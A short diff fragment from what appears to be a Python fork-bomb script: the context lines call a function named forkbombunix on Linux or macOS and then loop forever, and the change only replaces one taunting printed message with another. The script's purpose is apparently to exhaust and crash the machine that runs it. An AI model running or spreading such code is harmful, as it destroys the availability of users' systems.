@@ -48,4 +48,4 @@ if opsys == "Linux" or opsys == "Darwin":
     forkbombunix(i)
 
 while True:
-    print("get fucked")
+    print("L computer gone")
